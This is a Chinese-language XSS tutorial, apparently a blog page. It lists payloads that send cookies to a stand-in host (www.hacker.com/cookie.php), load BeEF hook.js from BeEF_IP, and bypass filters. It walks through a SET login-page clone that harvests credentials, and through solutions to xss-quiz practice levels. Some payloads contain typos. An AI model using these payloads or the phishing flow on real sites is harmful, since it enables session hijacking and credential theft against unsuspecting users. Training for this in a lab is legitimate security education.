<h5 id="构造XSS脚本-1"><a href="#构造XSS脚本-1" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">弹窗警告</span><br><span class="line">此脚本实现弹窗提示，一般作为漏洞测试或者演示使用，类似sql注入漏洞测试中的&#39;单引号，一旦此脚本能执行，也就意味着后端服务器没有对特殊符号进行过滤&lt;&gt;&#x2F;&#39;这样就可以证明，这个页面位置存在了XSS漏洞。</span><br><span class="line">&lt;script&gt;alert(&#39;xss&#39;);&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">页面嵌套</span><br><span class="line">&lt;iframe src&#x3D;http:&#x2F;&#x2F;www.baidu.com width&#x3D;300 height&#x3D;300&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;iframe src&#x3D;http:&#x2F;&#x2F;www.baidu.com width&#x3D;0 height&#x3D;0&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">页面重定向</span><br><span class="line">&lt;script&gt;window.location&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">弹框警告并重定向</span><br><span class="line">&lt;script&gt;alert(&quot;请移步到我们的新站&quot;);location.href&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(&#39;xss&#39;);location.href&#x3D;&quot;http:&#x2F;&#x2F;www.127.0.0.1&#x2F;upload&#x2F;5.txt&quot;&lt;&#x2F;script&gt;</span><br><span class="line">这里结合了一些社工的思路，例如：通过网站内部私信的方式将其发送给其他用户，如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户，(克隆网站收集账户)</span><br><span class="line"></span><br><span class="line">访问恶意代码</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&#x2F;xss.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;BeEF_IP:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">当别人看到script是脚本，脚本想想就是不好的，这样就可以巧妙运用图片标签了</span><br><span class="line">巧用图片标签</span><br><span class="line">&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;laert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;javascript:Falert(&#39;xss&#39;);&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;BeEF_IP:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;img&gt;</span><br><span class="line"></span><br><span class="line">绕开过滤的脚本</span><br><span class="line">大小写		&lt;ScrIpT&gt;alert(&#39;xss&#39;)&gt;&lt;&#x2F;ScrIpT&gt;</span><br><span class="line">字符编码采用URL、Base64等编码</span><br><span class="line"></span><br><span class="line">收集用户cookie</span><br><span class="line">打开新窗口并采用本地cookie访问目标网页。</span><br><span class="line">&lt;script&gt;window.open(&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;document.location&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php</span><br><span class="line">cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;new Image().src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;img&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>

<h4 id="自动化XSS"><a href="#自动化XSS" class="headerlink" title="自动化XSS"></a>自动化XSS</h4><h5 id="BeEF介绍"><a href="#BeEF介绍" class="headerlink" title="BeEF介绍"></a>BeEF介绍</h5><p>BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合Metasploit进行渗透；</p>
<p>BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单</p>
<p><a href="http://beefprohect.com/" target="_blank" rel="noopener">http://beefprohect.com/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">信息搜集：</span><br><span class="line">1、网络发现</span><br><span class="line">2、主机信息</span><br><span class="line">3、Cookie获取</span><br><span class="line">4、会话劫持</span><br><span class="line">5、键盘记录</span><br><span class="line">6、插件信息</span><br><span class="line"></span><br><span class="line">持久化控制：</span><br><span class="line">1、确认弹窗</span><br><span class="line">2、小窗口</span><br><span class="line">3、中间人</span><br><span class="line"></span><br><span class="line">社会工程：</span><br><span class="line">1、点击劫持</span><br><span class="line">2、弹窗警告</span><br><span class="line">3、虚假页面</span><br><span class="line">4、钓鱼网站</span><br><span class="line"></span><br><span class="line">渗透攻击：</span><br><span class="line">1、内网渗透</span><br><span class="line">2、Metasploit</span><br><span class="line">3、CSRF攻击</span><br><span class="line">4、DDOS攻击</span><br></pre></td></tr></table></figure>

<h5 id="BeEF基础"><a href="#BeEF基础" class="headerlink" title="BeEF基础"></a>BeEF基础</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">启动Apache和BeEF</span><br><span class="line">servic apache2 start</span><br></pre></td></tr></table></figure>

<h5 id="启动beef"><a href="#启动beef" class="headerlink" title="启动beef"></a>启动beef</h5><p>给了你地址和脚本</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409200826972.png" alt="image-20200409200826972"></p>
<p>可以不在kali中访问，直接复制地址在本机上访问，如果在本机访问不能使用127.0.0.1，需要改为kali的ip，进行访问，账号是beef密码是你自己当时开启beef时设置的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200411202430272.png" alt="image-20200411202430272"></p>
<p>在线浏览和离线浏览没有用户访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409201153784.png" alt="image-20200409201153784"></p>
<p>当其他机器访问，我们这个也面时，就会执行XSS存储型漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412072641793.png" alt="image-20200412072641793"></p>
<p>查看beef页面，这两台主机访问了我们的页面，成功将其ip抓取</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412072738166.png" alt="image-20200412072738166"></p>
<p>查看beef的Current Browser模块下的Details子模块，Details子模块下的内容是浏览器的详细信息，里面包含了你当前浏览器的所有信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412073005775.png" alt="image-20200412073005775"></p>
<h5 id="查看Commands组件，里面是可能存在的攻击点"><a href="#查看Commands组件，里面是可能存在的攻击点" class="headerlink" title="查看Commands组件，里面是可能存在的攻击点"></a>查看Commands组件，里面是可能存在的攻击点</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412101121579.png" alt="image-20200412101121579"></p>
<p>可以攻击一下查看是否能成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412103408590.png" alt="image-20200412103408590"></p>
<p>上面是已经攻击完的，点击第三步，查看是否有cook值，页面返回cookie值说明页面攻击成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412103459549.png" alt="image-20200412103459549"></p>
<h5 id="命令颜色"><a href="#命令颜色" class="headerlink" title="命令颜色"></a>命令颜色</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">绿色	对目标主机生效并且不可见(不会被发现)</span><br><span class="line">橙色	对目标主机生效但可能可见(可能被发现)</span><br><span class="line">灰色	对目标主机未必生效(可验证下)</span><br><span class="line">红色	对目标主机不生效</span><br></pre></td></tr></table></figure>

<h4 id="XSS盗取用户信息"><a href="#XSS盗取用户信息" class="headerlink" title="XSS盗取用户信息"></a>XSS盗取用户信息</h4><h5 id="1、盗取用户信息原理"><a href="#1、盗取用户信息原理" class="headerlink" title="1、盗取用户信息原理"></a>1、盗取用户信息原理</h5><p>克隆网站登录页面，利用存储xss设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入登录，账号和密码被存储。</p>
<p>用户正常访问存在XSS漏洞的原始站点，原始站点存在XSS漏洞，被利用之后进行跳转，跳转到被利用的克隆站点，克隆站点和原始站点类似，但是只克隆了他的登录界面，这个时候用户会访问到克隆站点的登录界面，这个时候可能由于安全意识的薄弱，会输入用户的账号密码，这样克隆站点就成功地读取了用户的用户名和密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412162004695.png" alt="image-20200412162004695"></p>
<h5 id="2、setookit工具克隆网站"><a href="#2、setookit工具克隆网站" class="headerlink" title="2、setookit工具克隆网站"></a>2、setookit工具克隆网站</h5><p>这是本地dvwa的登录界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164221318.png" alt="image-20200412164221318"></p>
<p>使用setookit来克隆一个登陆界面，在kali命令行中输入setookit</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164519559.png" alt="image-20200412164519559"></p>
<p>输入1选择Social-Engineering Attacks</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164637047.png" alt="image-20200412164637047"></p>
<p>输入2选择Website Attack Vectors</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164710431.png" alt="image-20200412164710431"></p>
<p>输入3选择Credential Harvester Attack Method</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164751037.png" alt="image-20200412164751037"></p>
<p>输入2选择Site Cloner，这个时候就会弹出kali的ip，不用输入内容直接回车</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164821609.png" alt="image-20200412164821609"></p>
<p>在这个位置输入本地的登录界面地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164913334.png" alt="image-20200412164913334"></p>
<p>将红线位置地址输入到kali 上</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412165011200.png" alt="image-20200412165011200"></p>
<p>输入完回车，这就是已经复制成功了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412165059221.png" alt="image-20200412165059221"></p>
<p>访问kali的ip地址查看是否有登录界面，成功克隆完成</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412165149142.png" alt="image-20200412165149142"></p>
<h5 id="3、存储型xss跳转克隆网站"><a href="#3、存储型xss跳转克隆网站" class="headerlink" title="3、存储型xss跳转克隆网站"></a>3、存储型xss跳转克隆网站</h5><p>xss payload：<code>&lt;script&gt;window.location=&quot;跳转的URL&quot;&lt;/script&gt;</code> </p>
<h5 id="4、查看盗取账号和密码"><a href="#4、查看盗取账号和密码" class="headerlink" title="4、查看盗取账号和密码"></a>4、查看盗取账号和密码</h5><p>输入xss payload，上传，这里的ip地址改为kali的ip也就是跳转的ip</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412171407361.png" alt="image-20200412171407361"></p>
<p>发现页面成功跳转，输入用户名和密码登录，登录的时候观察上方ip的变化</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412171430380.png" alt="image-20200412171430380"></p>
<p>登录后，在kali中查看信息，发现成功获取了用户名和密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412170229771.png" alt="image-20200412170229771"></p>
<h4 id="没有过滤的XSS"><a href="#没有过滤的XSS" class="headerlink" title="没有过滤的XSS"></a>没有过滤的XSS</h4><h5 id="1、实验环境介绍"><a href="#1、实验环境介绍" class="headerlink" title="1、实验环境介绍"></a>1、实验环境介绍</h5><p><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a></p>
<p>一个日本安全研究员制作的XSS练习靶场</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412192339311.png" alt="image-20200412192339311"></p>
<h5 id="2、html中文本标签b介绍"><a href="#2、html中文本标签b介绍" class="headerlink" title="2、html中文本标签b介绍"></a>2、html中文本标签b介绍</h5><p><code>&lt;b&gt;</code>标签规定粗体文本。</p>
<p><code>&lt;p&gt;</code>标签是段落，在段落中加入<code>&lt;b&gt;</code>标签，这是粗体文本的话加粗，普通文本不加粗</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412192548959.png" alt="image-20200412192548959"></p>
<h5 id="3、探测XSS过程"><a href="#3、探测XSS过程" class="headerlink" title="3、探测XSS过程"></a>3、探测XSS过程</h5><p>1、构造一个独一无二且不会被识别为恶意代码的字符串用来提交到页面。</p>
<p>说白了就是随便输，爱输啥输啥</p>
<p>例如：156165161das651d65asd51</p>
<p>按F12使用箭头选中输入的文字</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412193629918.png" alt="image-20200412193629918"></p>
<h5 id="4、闭合文本标签利用XSS"><a href="#4、闭合文本标签利用XSS" class="headerlink" title="4、闭合文本标签利用XSS"></a>4、闭合文本标签利用XSS</h5><p>这是一个最简单Payload，这里可以直接输出domain。</p>
<p>因为<code>&lt;b&gt;</code>标签中加入<code>&lt;script&gt;</code>这个标签可以直接识别为JavaScript，那么就会弹出domain</p>
<p>1、简单的Payload：<code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412201400697.png" alt="image-20200412201400697"></p>
<p>提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202013079.png" alt="image-20200412202013079"></p>
<p>点击确定，返回<strong>Congratulations!!</strong> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202024254.png" alt="image-20200412202024254"></p>
<p>比较复杂的Payload，闭合方式的Payload。</p>
<p>首先闭合双引号然后闭合<code>&lt;b&gt;</code>标签，后面是<code>&lt;script&gt;</code>代码，前面会闭合后面会当做普通文本输出</p>
<p>HTML中的标签比如说<code>&lt;b&gt;</code>标签它以它开始之后是对应的文本，结束是<code>&lt;/b&gt;</code>，如果只有<code>&lt;/b&gt;</code>的话，它会当做简单的字符串处理，而不会当作一个标签处理。</p>
<p>2、闭合标签Payload：<code>&quot;&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p>
<p>提交，点击确定</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202312416.png" alt="image-20200412202312416"></p>
<p>返回<strong>Congratulations!!</strong> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202332477.png" alt="image-20200412202332477"></p>
<h4 id="标签属性中的XSS"><a href="#标签属性中的XSS" class="headerlink" title="标签属性中的XSS"></a>标签属性中的XSS</h4><h5 id="1、配置Chrome关闭XSS-Auditor"><a href="#1、配置Chrome关闭XSS-Auditor" class="headerlink" title="1、配置Chrome关闭XSS-Auditor"></a>1、配置Chrome关闭XSS-Auditor</h5><p><a href="http://xss-quiz.int21h.jp/利用XSS过程中会出现下图情况。配置Chrome" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/利用XSS过程中会出现下图情况。配置Chrome</a> –args –disable-xss-auditor</p>
<p>右键谷歌浏览器复制地址，在桌面新建快捷方式，将地址复制进去，在将–args –disable-xss-auditor复制进去，就可以</p>
<p>这个配置只有在chrome提交xss信息报错XSS错误的时候用。如果没有报错就不需要配置了</p>
<h5 id="2、属性中得到XSS发现"><a href="#2、属性中得到XSS发现" class="headerlink" title="2、属性中得到XSS发现"></a>2、属性中得到XSS发现</h5><p>技巧：ctrl+F 搜索特定的字符串</p>
<p>页面并没有显示我们输入的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412205955459.png" alt="image-20200412205955459"></p>
<p>按F12查看元素，可以直接使用箭头，然后选择输入框，也可以使用ctrl+f进行搜索</p>
<p>箭头这两处都可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412210200170.png" alt="image-20200412210200170"></p>
<h5 id="3、属性中的XSS闭合引入script"><a href="#3、属性中的XSS闭合引入script" class="headerlink" title="3、属性中的XSS闭合引入script"></a>3、属性中的XSS闭合引入script</h5><p>闭合引号尖括号，引入script</p>
<p>当然也可以在双引号前面加上值</p>
<p><code>&quot;&gt;&lt;script&gt;alert(document.domuin);&lt;/script&gt;</code>将这段代码复制到输入框提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412213252200.png" alt="image-20200412213252200"></p>
<p>提交，返回弹框点击确定</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412213328524.png" alt="image-20200412213328524"></p>
<p>返回<strong>Congratulations!!</strong> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412213356826.png" alt="image-20200412213356826"></p>
<h5 id="4、属性中的XSS闭合引入事件"><a href="#4、属性中的XSS闭合引入事件" class="headerlink" title="4、属性中的XSS闭合引入事件"></a>4、属性中的XSS闭合引入事件</h5><p>onmouseover意思就是当鼠标移动到输入框时弹出后面的内容</p>
<p>Payload：<code>&quot;onmouseover=alert(document.domain);&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412214012337.png" alt="image-20200412214012337"></p>
<p>提交之后将鼠标放到输入框上，就会弹出内容，将鼠标放到篮框中就会弹出内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412214101416.png" alt="image-20200412214101416"></p>
<p>返回<strong>Congratulations!!</strong> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412214152472.png" alt="image-20200412214152472"></p>
<h4 id="选择列表中的XSS"><a href="#选择列表中的XSS" class="headerlink" title="选择列表中的XSS"></a>选择列表中的XSS</h4><h5 id="1、HTML-select标签介绍"><a href="#1、HTML-select标签介绍" class="headerlink" title="1、HTML select标签介绍"></a>1、HTML select标签介绍</h5><p>select元素可以创建单选或多选菜单。</p>
<p><code>&lt;select&gt; 元素中的 &lt;option&gt;</code>标签用于定义列表中的可用选项</p>
<h5 id="2、表单介绍"><a href="#2、表单介绍" class="headerlink" title="2、表单介绍"></a>2、表单介绍</h5><p>HTML表单用于搜集不同类型的用户输入</p>
<p>可以使用浏览器查看提交的数据</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413092056335.png" alt="image-20200413092056335"></p>
<h5 id="3、Burpsuite测试XSS"><a href="#3、Burpsuite测试XSS" class="headerlink" title="3、Burpsuite测试XSS"></a>3、Burpsuite测试XSS</h5><p>使用burpsuite截取HTTP请求，修改提交参数</p>
<p>可以在蓝线处进行修改写入XSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413093804378.png" alt="image-20200413093804378"></p>
<h5 id="4、闭合触发XSS"><a href="#4、闭合触发XSS" class="headerlink" title="4、闭合触发XSS"></a>4、闭合触发XSS</h5><p>这里不管是闭合还是不闭合都可以弹出xss，都可以通关</p>
<p>蓝线处可以加<code>&lt;/option&gt;</code>来闭合前面的列表也可以不用闭合</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413093933071.png" alt="image-20200413093933071"></p>
<p>点击go查看页面显示。</p>
<p>页面并没有返回<strong>Congratulations!!</strong> 通关信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094042891.png" alt="image-20200413094042891"></p>
<p>再点回Raw，复制链接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094159681.png" alt="image-20200413094159681"></p>
<p>点击Show response borwser，复制copy连接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094233493.png" alt="image-20200413094233493"></p>
<p>复制完连接去浏览器打开，成功出现弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094259472.png" alt="image-20200413094259472"></p>
<p>确定返回Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094344690.png" alt="image-20200413094344690"></p>
<h4 id="隐藏参数中的XSS"><a href="#隐藏参数中的XSS" class="headerlink" title="隐藏参数中的XSS"></a>隐藏参数中的XSS</h4><h5 id="1、HTML表单隐藏参数介绍"><a href="#1、HTML表单隐藏参数介绍" class="headerlink" title="1、HTML表单隐藏参数介绍"></a>1、HTML表单隐藏参数介绍</h5><p>隐藏域就是用来收集或者发送消息的不可见元素，对于网页的访问者来说，隐藏于是看不见的。表单被提交时，隐藏域就会将信息用你设置时定义的名称和值发送到服务器上。</p>
<p>代码格式：<code>&lt;input type=&quot;hidden&quot; name=&quot;...&quot; value=&quot;...&quot;&gt;</code></p>
<h5 id="2、Burpsutie抓包测试"><a href="#2、Burpsutie抓包测试" class="headerlink" title="2、Burpsutie抓包测试"></a>2、Burpsutie抓包测试</h5><p>使用burpsutie进行抓包，截取提交的HTTP请求。</p>
<p>使用浏览器审计和burp对照</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413101509383.png" alt="image-20200413101509383"></p>
<h5 id="3、HTML中svg介绍"><a href="#3、HTML中svg介绍" class="headerlink" title="3、HTML中svg介绍"></a>3、HTML中svg介绍</h5><p>SVG意为可缩放矢量图形（Scalable Vector Graphics）</p>
<p>SVG使用XML格式定义图像。</p>
<p>SVG文件可通过以下标签嵌入HTML文档：<code>&lt;embed&gt;</code>、<code>&lt;object&gt;</code>或者<code>&lt;iframe&gt;</code>。也可以使用svg标签插入</p>
<p>这里可以是斜杠也可以是空格</p>
<p><code>&lt;svf/事件=&quot;&quot;&gt;</code></p>
<h5 id="4、闭合触发XSS-1"><a href="#4、闭合触发XSS-1" class="headerlink" title="4、闭合触发XSS"></a>4、闭合触发XSS</h5><p><code>&quot;&gt;</code>闭合属性，使用<code>&lt;svg onload=alert(document.domain);&gt;</code>弹出对应的内容，使用<code>%0a</code>替换空格，来讲标签之间有一个间隙</p>
<p>Payload：<code>&quot;&gt;&lt;svg onload=alert(document.domain);&gt;%0a</code></p>
<p>经过测试，在p1，p2后面输入xss代码，xss代码都会被网页直接输出，只有在p3的时候xss代码才没有回显到网页上。查看源代码发现，value显示了我们之前提交的内容，script脚本被加载到<code>type=&quot;hidden&quot;</code>和<code>value=&quot;hackme&quot;</code>当中，这时候我们可以使用闭合方式或者其他方式进行对应的测试。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413103113469.png" alt="image-20200413103113469"></p>
<p>我们使用闭合查看是否能被输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413103928497.png" alt="image-20200413103928497"></p>
<p>页面成功被输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413103956585.png" alt="image-20200413103956585"></p>
<p>点击确定，页面返回Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104028973.png" alt="image-20200413104028973"></p>
<p>上面说的是svg但这里实验的是script，当然svg也可以只是没必要非要用svg</p>
<p>演示，进行抓包，将svg的Payload复制到p3的hackme后面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104605249.png" alt="image-20200413104605249"></p>
<p>Forward放行，查看页面是否返回，同样可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104628621.png" alt="image-20200413104628621"></p>
<p>返回了Congratulations!! ，这样也行。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104657566.png" alt="image-20200413104657566"></p>
<h4 id="限制输入长度的XSS"><a href="#限制输入长度的XSS" class="headerlink" title="限制输入长度的XSS"></a>限制输入长度的XSS</h4><h5 id="1、HTML表单文本框介绍"><a href="#1、HTML表单文本框介绍" class="headerlink" title="1、HTML表单文本框介绍"></a>1、HTML表单文本框介绍</h5><p>HTML表单用于搜索不用类型的用户输入，表单元素指的是不同类型的input元素、复选框，单选按钮，提交按钮等，text定义常规文本输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">属性介绍：</span><br><span class="line">value属性规定输入字段的初始值</span><br><span class="line">readonly属性规定输入字段为只读（不能修改）。</span><br><span class="line">disabled属性规定输入字段是禁用的，被禁用的元素是不可用的和不可点击的。被禁用的元素不会被提交</span><br><span class="line">size属性规定输入字段尺寸（以字符计）</span><br><span class="line">maxlength属性规定输入字段允许的最大长度</span><br><span class="line">如设置maxlength属性，则输入控件不会接受超过所允许数的字符</span><br><span class="line">该属性不会提供任何反馈，如果需要提醒用户，必须编写JavaScript代码</span><br></pre></td></tr></table></figure>

<h5 id="2、XSS-Payload长度计算"><a href="#2、XSS-Payload长度计算" class="headerlink" title="2、XSS Payload长度计算"></a>2、XSS Payload长度计算</h5><p>使用Python内置函数len(字符串)计算对应的字节数</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413111230387.png" alt="image-20200413111230387"></p>
<h5 id="3、浏览器审查工具修改源码"><a href="#3、浏览器审查工具修改源码" class="headerlink" title="3、浏览器审查工具修改源码"></a>3、浏览器审查工具修改源码</h5><p>当我们一直按住1的时候发现输入到15个长度就不能输入了，F12查看代码，发现maxlength限制了字符的长度是15。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413111547950.png" alt="image-20200413111547950"></p>
<p>我们可以进行更改，将15改为150，这样就可以输入更多的字符了，当然长度不能超过150</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413111727842.png" alt="image-20200413111727842"></p>
<h5 id="4、Payload触发XSS漏洞"><a href="#4、Payload触发XSS漏洞" class="headerlink" title="4、Payload触发XSS漏洞"></a>4、Payload触发XSS漏洞</h5><p>更改长度之后我们插入xss，闭合<code>&lt;input&gt;</code>，<code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p>
<p>提交信息，页面弹出弹框，说明成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413112410445.png" alt="image-20200413112410445"></p>
<p>点击确定返回Congratulations!! ，通关成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413112542216.png" alt="image-20200413112542216"></p>
<h4 id="HTML事件中的XSS"><a href="#HTML事件中的XSS" class="headerlink" title="HTML事件中的XSS"></a>HTML事件中的XSS</h4><h5 id="1、HTML事件介绍"><a href="#1、HTML事件介绍" class="headerlink" title="1、HTML事件介绍"></a>1、HTML事件介绍</h5><p>在现代浏览器中都内置大量的事件处理器。这些处理器会监事特定的条件或用户行为，例如鼠标单击，或浏览器窗口中完成加载某个图案。用过是用JavaScript，可以将某些特定的事件处理器作为属性添加给特定的标签，并可以在事件发生时执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413133315239.png" alt="image-20200413133315239"></p>
<h5 id="2、XSS漏洞发现"><a href="#2、XSS漏洞发现" class="headerlink" title="2、XSS漏洞发现"></a>2、XSS漏洞发现</h5><p>说白了是随便打，F12能找到就行</p>
<p>设置独一无二字符串提交，在响应中寻找</p>
<p>随便输入字符，F12使用左上角箭头选择输入框，找到你输入的内容</p>
